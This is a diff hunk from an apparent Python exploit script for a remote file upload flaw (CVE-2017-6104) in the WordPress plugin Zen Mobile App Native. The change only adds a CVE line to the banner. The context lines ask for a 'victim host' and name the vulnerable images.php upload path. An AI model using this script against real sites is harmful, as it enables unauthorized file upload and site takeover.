@@ -2,7 +2,7 @@ import requests
 import random
 import string
 print "---------------------------------------------------------------------"
-print "Vulnerability: Mobile App Native <= 3.0 - Remote File Upload Exploit\nDisclosure Date: 2017-02-28\nDiscovery: Larry W. Cashdollar\nExploit Author: Munir Njiru\nWPVDB ID: 8743\nCWE: 434\nReference URL: 	http://www.vapidlabs.com/advisory.php?v=178\nPlugin URL: http://plugins.svn.wordpress.org/zen-mobile-app-native/\n"
+print "Vulnerability: Mobile App Native <= 3.0 - Remote File Upload Exploit\nDisclosure Date: 2017-02-28\nDiscovery: Larry W. Cashdollar\nExploit Author: Munir Njiru\nCVE-ID: CVE-2017-6104\nWPVDB ID: 8743\nCWE: 434\nReference URL: 	http://www.vapidlabs.com/advisory.php?v=178\nPlugin URL: http://plugins.svn.wordpress.org/zen-mobile-app-native/\n"
 print "---------------------------------------------------------------------"
 victim = raw_input("Please Enter victim host e.g. http://example.com: ")
 slug = "/wp-content/plugins/zen-mobile-app-native/server/images.php"
